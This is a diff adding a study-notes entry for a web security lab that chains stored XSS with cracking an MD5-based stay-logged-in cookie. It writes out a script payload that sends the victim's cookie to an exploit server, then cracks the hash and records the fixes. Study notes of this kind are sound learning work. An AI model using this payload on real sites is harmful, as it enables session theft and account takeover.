@@ -1688,7 +1688,40 @@ pattern match: 5th distinct auth bug category —
   Lab 8    = security control is opt-in (missing session = no protection)
   Lab 9    = forgeable token — known algorithm + no server-side secret
              lets attacker CONSTRUCT valid credentials instead of guessing them
-             
+
+Lab 10 — Offline password cracking (XSS + cookie cracking chain) — DONE
+credentials: wiener:peter / target: carlos
+
+mechanism: chains two separate vulnerability classes together
+  1. stored XSS in comment functionality (confirmed with <b>test</b> first,
+     then real payload) to exfiltrate carlos's stay-logged-in cookie to
+     an attacker-controlled exploit server — fires automatically for
+     anyone viewing the comment, no click needed from victim
+     payload: <script>document.location='https://SERVER/exploit?c='
+     +document.cookie</script>
+  2. same cookie-cracking technique as Lab 9: base64-decode stay-logged-in
+     -> username:MD5(password) -> crack hash via crackstation
+     carlos:26323c16d5f4dabff3bb136f2460a943 -> MD5 -> "onceuponatime"
+
+method: posted XSS payload as a comment -> waited/checked exploit server log
+        -> captured carlos's stay-logged-in cookie from the GET request log
+        -> decoded, cracked hash, logged in as carlos, deleted account
+
+why it exists: (1) stored XSS = unsanitized user input rendered as executable
+               HTML/JS for other viewers (2) same weak cookie format as
+               Lab 9 — MD5(password) with no server-side secret, crackable
+               once obtained
+fix: sanitize/encode all user-supplied comment content before rendering
+     (XSS fix) AND stop deriving auth tokens from a bare hash of the
+     password (Lab 9's fix — HMAC with server-side secret instead)
+
+pattern match: real-world lesson — vulnerabilities chain. XSS alone gives you
+               a cookie; Lab 9's weak cookie design alone requires you to
+               already have a cookie to crack. Combined: XSS delivers a
+               cookie you didn't have, weak hashing makes that cookie
+               crackable into a real password — full account takeover
+               from two only-moderately-severe bugs individually
+                            
                                         
 ======================================================
 THINGS I STILL NEED TO PRACTICE
